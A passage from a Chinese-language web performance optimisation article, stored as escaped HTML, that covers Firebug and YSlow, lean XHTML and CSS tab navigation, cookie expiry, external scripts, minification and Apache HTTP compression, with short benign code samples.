应用程序中获得像桌面软件那样的高速响应体验非常困难，因此性能优化非常重要。幸运的是，一些工具和最佳实践可用于缩短响应和加载时间，提供更加流畅的体验。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-container dw-container-sidebar ibm-alternate-two&quot;&gt;&lt;div class=&quot;ibm-container-body&quot;&gt;&lt;p&gt;根据 Birds-Eye 的 2007 宽带统计显示，美国境内 25% 的人没有 Internet 连接，53% 的人拥有宽带，21% 的人仍然在使用拨号连接。&lt;/p&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;79&quot;&gt;&lt;a name=&quot;toolsessentials&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;基本工具&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;对于所有与优化相关的任务，您必须使用工具来诊断瓶颈和识别问题。现在在 Web 开发中使用最广泛的两个工具是 Firebug 和 YSlow，它们都是开源、免费的 Firefox 插件。 &lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;80&quot;&gt;&lt;a name=&quot;firebug&quot;&gt;&lt;span class=&quot;smalltitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;3&quot;&gt;Firebug&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;81&quot;&gt;Firebug（参见 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#resources&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;参考资料&lt;/font&gt;&lt;/a&gt;）是最流行的 Firefox 扩展之一，该应用程序能够使 Web 开发人员的工作更加轻松。它包含许多非常有用的功能，比如：&lt;/p&gt;\r\n&lt;ul&gt;&lt;li&gt;JavaScript 调试 &lt;li&gt;JavaScript 命令行 &lt;li&gt;监视 JavaScript 性能和跟踪 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;XmlHttpRequests&lt;/font&gt;&lt;/code&gt; &lt;li&gt;登录 Firebug 控制台 &lt;li&gt;跟踪 &lt;li&gt;检查 HTML 元素和动态编辑 HTML 代码 &lt;li&gt;动态编辑 CSS 文档 &lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;82&quot;&gt;&lt;a name=&quot;yslow&quot;&gt;&lt;span class=&quot;smalltitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;3&quot;&gt;YSlow&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;83&quot;&gt;YSlow（参见 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#resources&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;参考资料&lt;/font&gt;&lt;/a&gt;）分析网页，并根据 Yahoo! 起草的高性能网站规则（参见 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#resources&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;参考&lt;/font&gt;&lt;/a&gt;），告诉您网页加载缓慢的原因。YSlow 是一个与 Firebug 集成的 Firefox 插件，因此您需要首先安装 Firebug，然后才能安装和使用 YSlow。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;85&quot;&gt;&lt;a name=&quot;installfirebug&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;安装 Firebug&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;两个 Firefox 扩展的安装过程都非常简单。要安装 Firebug，执行以下步骤：&lt;/p&gt;\r\n&lt;ol sizcache=&quot;20&quot; sizset=&quot;86&quot;&gt;&lt;li sizcache=&quot;20&quot; sizset=&quot;86&quot;&gt;打开 Firefox，转到 &lt;a href=&quot;http://www.getfirebug.com/&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;Firebug 主页&lt;/font&gt;&lt;/a&gt;。 &lt;li&gt;安装最新版的 Firebug。 &lt;li&gt;如果 Firefox 配置为阻止弹出窗口，单击 &lt;strong&gt;Allow&lt;/strong&gt; 允许打开安装窗口。否则，单击 &lt;strong&gt;Install Now&lt;/strong&gt;。 &lt;li&gt;重启 Firefox。 &lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;90&quot;&gt;&lt;a name=&quot;installyslow&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;安装 YSlow&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;安装 Firebug 之后，接下来安装 YSlow。为此，执行以下步骤：&lt;/p&gt;\r\n&lt;ol sizcache=&quot;20&quot; sizset=&quot;91&quot;&gt;&lt;li sizcache=&quot;20&quot; sizset=&quot;91&quot;&gt;打开 Firefox，然后转到 &lt;a href=&quot;http://developer.yahoo.com/yslow&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;YSlow 主页&lt;/font&gt;&lt;/a&gt;。 &lt;li&gt;安装插件，然后重启 Firefox。 &lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;与许多其他 Firefox 扩展不同，YSlow 不会自动启动。必须首先激活它。 &lt;/p&gt;\r\n&lt;li&gt;要激活 YSlow，在状态栏右键单击其图标，然后单击 &lt;strong&gt;Autorun&lt;/strong&gt;。 &lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;95&quot;&gt;&lt;a name=&quot;commonsense&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;常识：牢记设计规则&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;令人惊讶的是简单的设计规则通常会被忽视，最终产生未经优化的、下载缓慢的网页。牢记以下规则，页面的加载速度将会更快。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;96&quot;&gt;&lt;a name=&quot;goodstructure&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;使用良好的结构&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;可扩展 HTML (XHTML) 具有许多优势，但是其缺点也很明显。XHTML 可能使您的页面更加符合标准，但是它大量使用标记（强制性的 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;&amp;lt;start&amp;gt;&lt;/font&gt;&lt;/code&gt; 和 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;&amp;lt;end&amp;gt;&lt;/font&gt;&lt;/code&gt; 标记），这意味着浏览器要下载更多代码。所以，事情都有两面性，尝试在您的网页中使用较少的 XHTML 代码，以减小页面大小。&lt;/p&gt;\r\n&lt;p&gt;如果您确实不得不使用 XHTML，试着尽可能对它进行优化。例如，删除空格并采用严格的 XHTML 编码实践，提高下载和解析速度。要严格执行 XHTML Strict 规则，向文档中添加以下 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;doctype&lt;/font&gt;&lt;/code&gt; 语句： &lt;/p&gt;\r\n&lt;p&gt;&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;&amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;          &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&amp;gt;&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;XHTML 1.0 Strict 与 Strict HTML 4.01 是等效的，包含的属性和元素没有出现在 HTML 4.01 规范的反对内容中。记住，有两个标记能够在 XHTML Transitional 中使用，但不能在 XHTML Strict 中使用，例如：&lt;/p&gt;\r\n&lt;ul&gt;&lt;li&gt;&lt;code&gt;&lt;font size=&quot;2&quot;&gt;&amp;lt;center&amp;gt;&lt;/font&gt;&lt;/code&gt; &lt;li&gt;&lt;code&gt;&lt;font size=&quot;2&quot;&gt;&amp;lt;font&amp;gt;&lt;/font&gt;&lt;/code&gt; &lt;li&gt;&lt;code&gt;&lt;font size=&quot;2&quot;&gt;&amp;lt;iframe&amp;gt;&lt;/font&gt;&lt;/code&gt; &lt;li&gt;&lt;code&gt;&lt;font size=&quot;2&quot;&gt;&amp;lt;strike&amp;gt;&lt;/font&gt;&lt;/code&gt; &lt;li&gt;&lt;code&gt;&lt;font size=&quot;2&quot;&gt;&amp;lt;u&amp;gt;&lt;/font&gt;&lt;/code&gt; &lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;97&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;98&quot;&gt;&lt;a name=&quot;overload&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;不要使布局超载&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;在博客（和新的站点）流行起来之前，让页面水平滚动甚至垂直滚动被认为是糟糕的实践。页面越小，越难以（但并不是不可能）完好地填充屏幕。现在，对于博客和内容驱动的网站，不时可以看到几百 Kb 大小的长页面。是的，您需要填充更多空间，但是这并不意味着您必须使用大的背景图像、大量表格或者许多内容来填充。坚持简约原则：少即是多。页面中充斥着各种类型的图像、视频、广告等，这大大违背实用性原则，因此，在增加页面的内容时请三思。 &lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;99&quot;&gt;&lt;a name=&quot;imagestext&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;不要使用图像来表示文本&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;我们很少会控制字体在不同浏览器中的显示方式，与字体不同的是，图像总是精确地按照其设计方式来显示。但这不能当作使用图像来表示文本的借口。&lt;/p&gt;\r\n&lt;p&gt;使用图像表示文本的最常见示例就是在导航栏中。美观的按钮更加具有吸引力，但是它们的加载速度很慢。此外，图像仍然不能由搜索引擎直接索引，因此，使用图像进行导航不利于搜索引擎优化（search engine optimization，SEO）。当无需图像就可以通过大量 CSS 技巧创建漂亮的按钮时，绝不使用图像来表示文本。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;100&quot;&gt;&lt;br /&gt;\r\n除了体积较小之外，这种实现导航的方式也更加符合 Web 标准。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-container dw-container-sidebar ibm-alternate-two&quot;&gt;&lt;div class=&quot;ibm-container-body&quot;&gt;&lt;p&gt;遵循统称为 &lt;em&gt;Web 标准&lt;/em&gt; 的一组最佳实践的网站具有精简性、可访问性、搜索引擎友好性、适用性和基于 CSS 的特征。&lt;/p&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;102&quot;&gt;&lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#list1&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;清单 1&lt;/font&gt;&lt;/a&gt; 和 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#list2&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;清单 2&lt;/font&gt;&lt;/a&gt; 中的代码以纯 CSS/XHTML 的形式实现基于选项卡的导航功能。 &lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&lt;a name=&quot;list1&quot;&gt;&lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;2&quot;&gt;清单 1. 基于选项卡导航的 CSS 文档&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;\r\n&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;				    #nav {      float:left;      width:100%;      background:#E7E5E2;      font-size:95%;      line-height:normal;      border-bottom:1px solid #54545C;      }    #nav ul {	margin:0;	padding:10px 10px 0 50px;	list-style:none;      }    #nav li {      display:inline;      margin:0;      padding:0;      }    #nav a {      float:left;      background:url(&quot;tableftK.gif&quot;) no-repeat left top;      margin:0;      padding:0 0 0 4px;      text-decoration:none;      }    #nav a span {      float:left;      display:block;      background:url(&quot;tabrightK.gif&quot;) no-repeat right top;      padding:5px 15px 4px 6px;      color:#FFF;      }    /* Commented Backslash Hack hides rule from IE5-Mac \\*/    #nav a span {float:none;}    /* End IE5-Mac hack */    #nav a:hover span {      color:#FFF;	  background-position:100% -42px;      }    #nav a:hover {      background-position:0% -42px;      }    #nav a:hover span {      background-position:100% -42px;	  }&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;a name=&quot;list2&quot;&gt;&lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;2&quot;&gt;清单 2. 基于选项卡导航的 HTML 代码&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;\r\n&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;				&amp;lt;div id=&quot;nav&quot;&amp;gt;  &amp;lt;ul&amp;gt;    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; title=&quot;Link 1&quot;&amp;gt;&amp;lt;span&amp;gt;Link 1&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; title=&quot;Link 2&quot;&amp;gt;&amp;lt;span&amp;gt;Link 2&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; title=&quot;Link 3&quot;&amp;gt;&amp;lt;span&amp;gt;Link 3&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; title=&quot;Longer Link Text&quot;&amp;gt;&amp;lt;span&amp;gt;Longer Link Text&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; title=&quot;Link 5&quot;&amp;gt;&amp;lt;span&amp;gt;Link 5&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;  &amp;lt;/ul&amp;gt;&amp;lt;/div&amp;gt;&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;106&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;107&quot;&gt;&lt;a name=&quot;cookie&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;检查 cookie 使用情况&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;cookie 可能是很小的文件，但是浏览器仍然需要下载它们。较大的 cookie 所需的下载时间更长，进而增加了浏览器加载网页的时间。正因为如此，尽可能缩小 cookie 来最小化对浏览器响应时间的影响非常重要。&lt;/p&gt;\r\n&lt;p&gt;此外，设置一个较早的 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;expire&lt;/font&gt;&lt;/code&gt; 日期或者根本不设置 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;expire&lt;/font&gt;&lt;/code&gt; 日期，会缩短响应时间。要在 PHP 语言中设置 cookie 的 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;expire&lt;/font&gt;&lt;/code&gt; 日期，使用以下代码： &lt;/p&gt;\r\n&lt;p&gt;&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;&amp;lt;?php  $expire = 2592000 + time();  // Add 30 day’s to the current time  setcookie(userid, “123rrw3”, $expire);?&amp;gt;&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;这段代码设置 cookie &lt;code&gt;&lt;font size=&quot;2&quot;&gt;userid&lt;/font&gt;&lt;/code&gt;，并将 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;expire&lt;/font&gt;&lt;/code&gt; 日期设置为自当前日期之后 30 天。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;108&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;109&quot;&gt;&lt;a name=&quot;jojs&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;不要包含不必要的 JavaScript 代码，尽可能将其外部化&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;与 cookie 类似，JavaScript 文件的下载也需要时间，这不可避免地会降低整个页面的加载速度。因此，明智地使用 JavaScript（仅在真正必要时才使用）并优化脚本的大小和速度。&lt;/p&gt;\r\n&lt;p&gt;缩短 JavaScript 下载时间的另一种方式是使用外部文件，而不是包含脚本内联。这种方法也适用于 CSS，因为浏览器会缓存外部化的文本，而（在 HTML 页面自身中）以内联方式编码的 CSS 或 JavaScript 每次都会随 HTML 一起加载。要通过在 HTML 中引用 CSS 和 JavaScript 代码来外部化它们，可以使用具有以下形式的代码： &lt;/p&gt;\r\n&lt;p&gt;&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;&amp;lt;link href=&quot;/stylesheets/myStyle.css&quot; media=&quot;all&quot; rel=&quot;Stylesheet&quot; type=&quot;text/css&quot; /&amp;gt;   &amp;lt;script src=&quot;/javascripts/myJavascript.js&quot; type=&quot;text/javascript&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;110&quot;&gt;&lt;a name=&quot;avoidtables&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;尽可能避免使用表格&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;表格被用作网页的主要构建块，但是作为页面布局元素，使用表格现在被认为是糟糕的做法。有时候，您必须使用表格（并且它们被认为是显示表格数据的出色实践）。如果是这样，明确地指定表格单元格、行和列的宽度和高度，否则，浏览器必须执行许多操作来计算如何显示它们，这会降低页面加载速度： &lt;/p&gt;\r\n&lt;p&gt;&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;&amp;lt;td width=&quot;50px&quot; height=&quot;10px&quot;&amp;gt;...&amp;lt;/td&amp;gt;&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;111&quot;&gt;&lt;a name=&quot;remove&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;删除任何不必要的元素&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;可能这是所有技巧中最显而易见的一个，但是它也是最容易忘记的一个技巧。我曾经提到过 “少即是多”：这不仅是为了真正吸引更广泛的用户，还意味着需要下载和处理的东西更少。如果您真正需要在网页上放置许多内容，考虑将网页分为 2 个、3 个或更多的独立页面。 &lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;112&quot;&gt;&lt;a name=&quot;tips&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;一些优化网页的技巧&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;可以使用许多方法来优化您的网页，包括压缩 JavaScript 文件，使用超文本传输协议（Hypertext Transfer Protocol，HTTP）压缩，以及设置图像大小。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;113&quot;&gt;&lt;a name=&quot;compressjs&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;压缩和缩小 JavaScript 文件&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;JavaScript 文件可能非常大，这意味着在某些情形中，它们的下载时间可能比所有其他组件下载时间之和还长。解决此问题的一种方法是压缩 JavaScript 文件。您可以使用 GNU zip (gzip) 来完成此任务，因为许多浏览器都支持这种压缩算法。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;114&quot;&gt;另一种替代方法是缩小文件。这种方法删除代码中所有不必要的字符，比如制表符（tab）、新行和空格。它删除代码中的注释和空白，进一步缩小文件大小。外部和内部样式表都可以缩小。两种最流行的缩小工具是 JSMin 和 YUI Compressor（参见 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#resources&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;参考资料&lt;/font&gt;&lt;/a&gt;）。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;115&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;116&quot;&gt;&lt;a name=&quot;httpcompression&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;使用 HTTP 压缩，并始终使用小写的 div 和类名&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;可以使用 HTTP 压缩来减少服务器与浏览器之间的通信量。可以在 Apache 中配置 HTTP 压缩（.htaccess 文件），或者可以将其包含到页面中（对于 PHP，可以使用一个 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;HTTP_ACCEPT_ENCODING&lt;/font&gt;&lt;/code&gt; 选项）。但是请注意：不是所有浏览器都支持压缩。即使是支持压缩的浏览器，压缩和解压缩都会加重处理器的负载。要在 Apache 中启用地毯式（blanket）压缩（即压缩所有文本和 HTML），使用以下命令：&lt;/p&gt;\r\n&lt;p&gt;&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;AddOutputFilterByType DEFLATE text/html text/plain text/xml&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;另外，考虑一下您想要压缩的内容。图像、音乐和视频在创建时已经进行了压缩，因此您可以将压缩对象限制为 HTML、CSS 和 JavaScript 文件。&lt;/p&gt;\r\n&lt;p&gt;另一种减少压缩工作的技巧是使用小写形式的 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;&amp;lt;div&amp;gt;&lt;/font&gt;&lt;/code&gt; 元素和类名。由于大小写敏感性，并且使用的是无损压缩，&lt;code&gt;&lt;font size=&quot;2&quot;&gt;&amp;lt;header&amp;gt;&lt;/font&gt;&lt;/code&gt; 与 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;&amp;lt;Header&amp;gt;&lt;/font&gt;&lt;/code&gt; 不同，它们被压缩为两个不同的标记。在下面的例子中，对于压缩程序来说，&lt;code&gt;&lt;font size=&quot;2&quot;&gt;Important&lt;/font&gt;&lt;/code&gt; 类与 &lt;code&gt;&lt;font size=&quot;2&quot;&gt;important&lt;/font&gt;&lt;/code&gt; 类是不同的，这意味着对于压缩程序，它们表示不同的对象，因此被分别压缩为两段不同的文本。 &lt;/p&gt;\r\n&lt;p&gt;&lt;table cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;50%&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code-outline&quot;&gt;&lt;pre class=&quot;displaycode&quot;&gt;&amp;lt;div class=&quot;Important&quot;&amp;gt;read this!&amp;lt;/div&amp;gt;&amp;lt;div class=&quot;important&quot;&amp;gt;This will cost you some valuable load time&amp;lt;/div&amp;gt;&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;留意细节似乎无关紧要。但是当您优化文件时，所有细微的细节都应考虑在内。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;117&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; 